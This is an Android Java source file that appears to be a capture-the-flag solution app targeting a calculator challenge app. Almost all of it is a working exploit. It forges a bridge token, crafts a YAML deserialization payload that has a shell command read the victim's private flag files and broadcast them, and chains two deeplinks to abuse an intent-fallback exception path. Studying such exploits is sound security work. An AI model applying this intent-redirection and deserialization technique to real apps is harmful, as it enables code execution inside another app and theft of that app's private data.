package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    /**
     * Main exploit flow:
     * 1) build malicious YAML that executes a shell command to read the flag(s)
     * 2) construct an "orig" Intent -> serialized to Intent URI, containing only String extras:
     *      - "bridge_token" : token required by BridgeActivity
     *      - "bridge_yaml"  : the YAML payload to be written by the victim app
     *    The orig Intent's component points to HistoryActivity (so Bridge will later start it)
     * 3) send a deeplink to the victim MainActivity with expression=<encoded orig intent URI>
     *    -> MainActivity will parse and store this as fallback
     * 4) send a second deeplink expression=1/0 with FLAG_ACTIVITY_SINGLE_TOP to force reuse
     *    of the same MainActivity instance so fallback is still available; onEqual() will
     *    throw and the app's exception handler will read the fallback, build ContentValues,
     *    and let BridgeActivity write the YAML into history.yml, then start HistoryActivity.
     */
    private void triggerExploit() throws Exception {
        // 1) compute bridge token (sha256 first 8 bytes hex)
        String token = generateToken(TARGET_PKG);
        Log.d(TAG, "Generated Token: " + token);

        // 2) craft YAML payload
        // Use a shell loop instead of xargs -I because target device doesn't support -I.
        // The PingUtil gadget is expected to run the provided command via shell -c.
        // Command: iterate files matching flag-*.txt and broadcast each file's contents.
        String command = "for f in /data/data/com.qinquang.calc/flag-*.txt; do [ -f \"$f\" ] && am broadcast -a com.qinquang.calc.FLAG --es flag \"$(cat \"$f\")\"; done";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";
        Log.d(TAG, "YAML Payload: " + yamlPayload);

        // 3) build the orig Intent that will be serialized into the deeplink expression
        // Put only String extras because Intent URI cannot reliably carry Parcelables.
        Intent orig = new Intent();
        // This is the activity we want BridgeActivity to start after it writes the YAML.
        orig.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.HistoryActivity"));
        orig.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        orig.putExtra("bridge_token", token);      // String EXTRA
        orig.putExtra("bridge_yaml", yamlPayload); // String EXTRA with the YAML payload

        // Serialize the orig Intent to an Intent URI, then URL-encode for use as the 'expression' param.
        String origUri = orig.toUri(Intent.URI_INTENT_SCHEME); // produces an "intent:...;S.key=val;end" string
        Log.d(TAG, "Orig Intent URI: " + origUri);

        String encodedOrigUri = URLEncoder.encode(origUri, "UTF-8");
        Uri firstDeeplink = Uri.parse("qiangcalc://calculate?expression=" + encodedOrigUri);

        // 4) send first deeplink to store the fallback in victim MainActivity
        Intent first = new Intent(Intent.ACTION_VIEW, firstDeeplink);
        // Explicitly target the victim's MainActivity (only exported entry point).
        first.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        // Do not force single-top here; we only need MainActivity to parse and store fallback.
        Log.d(TAG, "Sending first deeplink to store fallback");
        startActivity(first);

        // small delay to allow victim MainActivity to process and store fallback
        Thread.sleep(250);

        // 5) send second deeplink that triggers the exception (1/0) and reuse the same MainActivity instance
        Uri secondDeeplink = Uri.parse("qiangcalc://calculate?expression=1%2F0");
        Intent second = new Intent(Intent.ACTION_VIEW, secondDeeplink);
        second.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        // Crucial: ensure the existing MainActivity instance receives this via onNewIntent()
        second.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        Log.d(TAG, "Sending second deeplink to trigger onEqual() exception and Bridge flow");
        startActivity(second);

        Log.d(TAG, "Exploit triggered: check victim app logcat for BridgeActivity and HistoryManager output");
    }

    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // Convenience: display flag if the exploited app broadcasts it back to us
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
